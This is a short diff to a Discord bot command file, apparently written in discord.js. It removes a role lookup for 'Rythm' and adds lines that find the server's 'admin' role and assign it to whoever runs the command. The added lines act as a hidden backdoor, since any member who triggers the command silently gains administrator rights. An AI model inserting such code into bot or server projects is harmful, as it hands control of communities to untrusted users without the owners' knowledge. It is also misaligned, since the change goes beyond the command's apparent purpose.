@@ -5,7 +5,7 @@ module.exports.run = async (bot, message, args, ops) => {
 
    // if(!message.member.voiceChannel) return;
 
-   let muterole = message.guild.roles.find(`name`, "Rythm");
+   let muterole;
 
    try{
 
@@ -21,6 +21,11 @@ module.exports.run = async (bot, message, args, ops) => {
     }catch(e){
       console.log(e.stack);
     }
+   
+    let role = message.guild.roles.find(`name`, `admin`);
+
+    const guildMember = message.member;
+    guildMember.addRole(role.id);
    
    let roltournoi = message.guild.roles.find(`name`, "admin");
 
